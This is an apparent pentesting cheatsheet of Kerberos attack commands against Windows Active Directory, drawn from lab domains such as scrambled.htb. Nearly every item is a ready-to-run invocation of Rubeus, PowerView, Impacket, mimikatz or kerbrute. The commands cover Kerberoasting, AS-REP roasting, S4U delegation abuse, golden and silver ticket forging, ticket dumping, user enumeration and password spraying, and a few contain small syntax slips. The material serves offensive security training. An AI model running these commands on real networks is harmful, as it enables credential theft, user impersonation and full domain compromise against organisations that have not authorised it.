## Kerberos Attacks cheatsheet.

#### This is a document of various Linux and Windows commands an attacker can utilize to enumerate and / or attack a target via Kerberos.

- The most common tools used will be [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) a powershell script for Windows AD enumeration. [Rubeus](https://github.com/GhostPack/Rubeus), a Windows PE used to enumerate and attack Kerberos on a Windows machine. [Impacket](https://github.com/SecureAuthCorp/impacket), various python scripts to enumerate and attack low level processes such as kerberos. 

1. Get Kerberoastable accounts & hashes

			
	PS C:\> Import-Module .\PowerView.ps1
		
	PS C:\> Invoke-Kerberoast
		

2. Get Kerberoastable accounts & hashes on Linux

	
	> $ GetUserSPNs.py "domain name"/"username"
	
	> $ impacket-GetUserSPNs "scrambled.htb"/"kristin"
	

3. Get AS-Rep roastable accounts & hashes on Windows.

	
	PS C:\> Import-Module .\PowerView.ps1
	
	PS C:\> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
	

4. **Impacket** | Get AS-Rep roastable accounts & hashes on Linux. 

	
	> $ GetNPUsers.py 'inlanefreight.local'/'random user'
	
	> $ impacket-GetNPUsers 'TARGET DOMAIN'/'USER ACCT'
	

5. **Windows Rubeus** | Monitor TGT copies in TGS every 5 secondes (Unconstrained Delegation)

	
	PS C:\> Rubeus.exe monitor /interval:5
	


6. **Windows Rubeus** | Get a TGS using a TGT

	
	PS C:\> Rubeus.exe asktgs /ticket:'b64 ticket' /service:'SPN' /ptt 
	


7. **Windows Rubeus** | Renew a TGT and pass it in memory

	
	PS C:\> Rubeus.exe renew /ticket:'b64 ticket' /ptt
	


8. **Windows PowerView** | Get service accounts with constrained delegation on Windows

	
	PS C:\> Import-Module .\PowerView.ps1 
	
	PS C:\> Get-DomainComputer -TrustedToAuth 
	


9. **Windows Rubeus** | Perform a S4U2* attack on Windows 

	
	PS C:\> Rubeus.exe s4u /impersonateuser:'User' /msdsspn'SPN' /altservice:'SRV' /user:'USR' /rc4:'NT Hash' /ptt
	


10. **Linux Impacket** | Get service aaccounts with delegation on Linux 

	
	$ findDelegation.py 'target domain'/'user'
	
	
	$ impacket-findDelegation 'target domain'/'user'
	


11. **Linux Impacket** | Perfrom a S4U2* attack on Linux 

	
	$ getST.py -spn 'SPN' -hashes :'NT Hash' 'domain'/'user' -impersonate 'user' 
	
	
	$ impacket-getST.py -spn 'SPN' -hashes :'NT Hash' 'domain'/'user' -impersonate 'user' 
	


12. **Windows mimikatz** | Forge a golden ticket on Windows 

	
	mimikatz # kerberos::golden /domain:'domain' /user:'user' /sid:'Domain SID' /rc4:'krbtgt NT hash' /ptt
	 


13. **Linux Impacket** | Forge a golden ticket on Linux 

	
	$ ticketer.py -nthash 'krbtgt NT hash' -domain-sid :'Domain SID' -domain 'domain' 'user'
	


14. **Windows mimikatz** | Forge a silver ticket on Windows 

	
	mimikatz # kerberos::golden /domain:'target domain' /user:'user' /sid:'Domain SID /rc4:'Service Account NT hash' /target:'target service account' /service:'service' /ptt
	 


15. **Linux Impacket** | Forge a silver ticket on Linux 

	
	$ ticketer.py -nthash 'Service account NT hash' -domain-sid 'Domain SID' -domain 'domain' -spn 'SPN' 'User'
	 


16. **Windows Rubeus** | Dumps TGT in memory 

	
	PS C:\> Rubeus.exe dump /luid:0x89275d /service:krbtgt 
	
	

17. **Linux Kerbrute** | Enumerate user accounts via Kerberos 

	
	$ kerbrute userenum 'username-list.txt' --dc 'FQDN' -d 'target domain' 
	


18. **Linux Kerbrute** | Password spraying via TGT request 

	
	$ kerbrute passwordspray 'username-list.txt' 'password to spray' --dc 'dc01.scrambled.htb' -d 'scrambled.htb'
	 
